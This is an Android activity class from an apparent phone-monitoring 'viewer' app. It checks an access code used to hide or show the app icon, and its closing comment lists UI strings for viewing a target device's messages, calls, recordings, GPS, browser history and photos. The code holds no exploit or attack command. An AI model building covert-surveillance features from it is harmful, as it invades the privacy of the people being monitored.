/*
  ClassName: AccessCode.java
  AppName: ViewerApp
  Created by Lucas Walker (lucas.walker@jexpa.com)
  Created Date: 2018-06-05
  Description: Class AccessCode use this to select code that you manually specify to hide or show the app icon.
  History:2018-10-08
  Copyright © 2018 Jexpa LLC. All rights reserved.
 */

package com.scp.viewer.View;

import android.content.Intent;
import android.os.Bundle;
import com.google.android.material.textfield.TextInputEditText;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;

import com.scp.viewer.API.APIURL;
import com.scp.viewer.R;
import com.r0adkll.slidr.Slidr;

public class AccessCode extends AppCompatActivity {
    private TextInputEditText edt_AccessCode;
    private String textCode;
    private Toolbar toolbar;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_access_code);
        Slidr.attach(this);
        toolbar = findViewById(R.id.toolbar_AccessCode);
        toolbar.setTitle(R.string.AccessCode);
        toolbar.setBackgroundResource(R.drawable.custom_bg_shopp);
        setSupportActionBar(toolbar);
        if (getSupportActionBar() != null) {
            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        }
        edt_AccessCode = findViewById(R.id.edt_AccessCode);
        String accessCode = getIntent().getStringExtra("Access_Code");
        edt_AccessCode.setText(accessCode);
        // By pressing the button btn_Save_AccessCode will save the value of the Access Code
        // EdiText edt_AccessCode sends the Access Code value back to the Dashboard class
        Button btn_Save_AccseesCode = findViewById(R.id.btn_Save_AccseesCode);
        btn_Save_AccseesCode.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                textCode = edt_AccessCode.getText().toString();
                checkOnBack();
            }
        });
    }

    /***
     * Sends access code
     * Sends the user value from the AccessCode.java class to the Dashboard.java class.
     */
    @Override
    public void finish() {
        Intent data = new Intent();
        textCode = edt_AccessCode.getText().toString();
        data.putExtra("Code", textCode);
        setResult(RESULT_OK, data);
        super.finish();
    }

    /***
     * Check access code
     * Check that the access code of the user has the correct initial # and the last character is *.
     */
    @Override
    public void onBackPressed() {
        textCode = edt_AccessCode.getText().toString();
        checkOnBack();
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {

        if (item.getItemId() == android.R.id.home) {
            checkOnBack();
        }
        return true;
    }

    private void checkOnBack()
    {
        textCode = edt_AccessCode.getText().toString();
        if (textCode.startsWith("#") && textCode.endsWith("*")) {
            finish();
            super.onBackPressed();
        } else {
            APIURL.alertDialog(AccessCode.this, "Note!", "The access code must start with # and end with *.");
        }
    }


    /*
      / ManagementDevice   /
     "CellularDataOffTitle"="Cellular Data is Turned Off";
     "CellularDataOffMessage"="Turn on cellular data or use Wi-Fi to access data";
     "CellularDataOffCancelBT"="OK";
     "AddDeviceNow"="Add This Device Now";
     "LogOut"="Log Out";
     "About"="About";
     "Versions"="Versions";
     "DevicesList"="DEVICES LIST";
     "ConfirmRegisterRow"="Are you sure you want to register now?";
     "Cancel"="Cancel";
     "AddDeviceBT"="Add This Device Now";
     "UnableRegisterTitle"="Unable to register device";
     "UnableRegisterMessage"="Device are contain a email of user, they are registered";
     "CancelBT"="OK";
     "DeviceRegistered"="Device has been registered";
     "CreateUserFailed"="Create user is failed";
     "DeviceContainsEmail"="Device contains an email of user, they are registered";
     "MaxDevice"="Max device for account";
     "PasswordIncorect"="Password don't match";
     "NotEmailType"="It's not a email type";
     "UnableRegisterDeviceNow"="Unable to register device now, please try later";
     /  DashBoard  /
     "SavedSuccessfully"="Saved successfully";
     "YourSettingsAreLimited"="Your settings are limited because your license has expired.";
     "DeviceHasBeenRemoved"="Device has been removed";
     "DeviceNotRemoved"="Device has not been removed";


     "ActionSaveSyncMessage"="Action Save & Sync will update these changes to target device. Are you sure?";
     "LastSync"="Last sync";
     "PhoneOS"="Phone OS";
     "PhoneVersion"="Phone OS Version";
     "RemoveDevice"="Remove Device";
     "Minutes"="minutes";
     "ConfirmationRemoveDeviceTitle"="Confirmation";
     "ConfirmationRemoveDeviceMessage"="Removing device from this account will make you cannot see the data of target device anymore. Are you sure?";
     "RemoveDeviceActionRemove"="Remove";
     "UnderConstructionTitle"="Under Construction";
     "UnderConstructionMessage"="Coming Soon";
     "HasJustNow"="Synced Just Now";

     /   Messages   /

     "UpdateJustNow"="Updated Just Now";
     "NotUpdateYet"="Not Update Yet";
     "LastUpdate"="Last Update";
     "ConfirmationDeleteConversationTitle"="Confirmation";
     "ConfirmationDeleteConversationMessages"="Delete conversation from this account will make you cannot see the data anymore. Are you sure?";
     "ConfirmationDeleteConversationDeleteBT"="Delete";
     "ConversationDeleted"="The conversation has been deleted";
     "ConversationNotDeleted"="The conversation cannot be deleted";
     "NoDataSelected"="No data selected";
     "NoDataDisplay"="No data to display";
     "MessagesNotDeleted"="The message cannot be deleted";
     "MessagesDeleted"="The message has been deleted";
     "UpdatingForSMS"="Updating for messages...";


     /     CALL    /

     "ConfirmationDeleteCallTitle"="Confirmation";
     "ConfirmationDeleteCallMessages"="Delete call history from this account will make you cannot see the data anymore. Are you sure?";
     "ConfirmationDeleteCallDeleteBT"="Delete";
     "CallNotDelete"="The call history cannot be deleted";
     "CallDeleted"="The call history has been deleted";
     "UpdateAt"="Update At";
     "UpdatingForCall"="Updating for call history...";

     /  SET_TEXT_VALUE   /

     "InvalidAccessCodeTitle"="Invalid Formatted Access Code";
     "InvalidAccessCodeMessage"="The access code is not formatted correctly, The access code must start with # and end with *.";

     /  FEEDBACK   /

     "FeedbackSent"="Feedback message has been sent successfully";
     "ValidateInput"="Input validation";

     /  GPS   /

     "GPSDeleted"="The GPS location has been deleted";
     "GPSdNotDeleted"="The GPS location cannot be deleted";
     "ConfirmationDeleteGPS"="Delete GPS location from this account will make you cannot see the data anymore. Are you sure?";

     "UnknownLocation"="Unknown location";
     "Loading"="Loading...";

     /  Application Usage   /

     "ApplicationDeleted"="The Application has been deleted";
     "ApplicatiodNotDeleted"="The Application cannot be deleted";
     "ConfirmationDeleteApplication"="Delete Application this account will make you cannot see the data anymore. Are you sure?";
     "UpdatingForapplication"="Updating for application usage...";

     /  URL   /


     "URLDeleted"="The browser history has been deleted";
     "URLNotDeleted"="The browser history cannot be deleted";
     "ConfirmationDeleteURL"="Delete browser history this account will make you cannot see the data anymore. Are you sure?";
     "Copy"="Copy";
     "Open"="Open on web browser";
     "UpdatingForBrowser"="Updating for browser history...";

     /    CONTACT /


     "ContactDeleted"="The contact has been deleted";
     "ContactNotDeleted"="The contact cannot be deleted";
     "ConfirmationDeleteContact"="Delete contact this account will make you cannot see the data anymore. Are you sure?";
     "Delete"="Delete";
     "Clear"="Clear";
     "OK"="OK";
     "CopyPhoneNumber"="The phone number has been copied to the temp memory";
     "UpdatingForContact"="Updating for contact...";


     /   CHAT DATA LOG   /


     "UpdatingForChatData"="Updating for data...";

     /  photos    /

     "ConfirmationDeletePhoto"="Delete photos this account will make you cannot see the data anymore. Are you sure?";
     "PhotosDeleted"="The photo has been deleted";


     /        NOTES   /

     "ConfirmationDeleteNote"="Delete Notes this account will make you cannot see the data anymore. Are you sure?";
     "NotesDeleted"="The Note has been deleted";
     "NoteNotDelete"="The Note history cannot be deleted";
     "UpdatingForNote"="Updating for note history...";

     /   forgot pass    /

     "EmailEmpty"="Email is empty";
     "EmailFormatIncorrect"="Email format incorrect";
     "SenMailMessages"="New password has been sent to your email address. If you do not see in INBOX folder then please check it in SPAM/BULK folders.";



     /      Register   /
     "InputRequired"="The input field is required";
     "RetypePasswordNotMatch"="Retype password does not match";
     "AccountCreatedSuccessfully"="Congratulation. You have successfully created an account";

     /    phone call /


     "ConfirmationDeletePhoneCall"="Delete phone call recording this account will make you cannot see the data anymore. Are you sure?";
     "PhoneCallNotDelete"="The phone call recording cannot be deleted";
     "PhoneCallDeleted"="The phone call recording has been deleted";
     "CanNotPlay"="Can't play the phone call recording now, Please try later";

     */
}
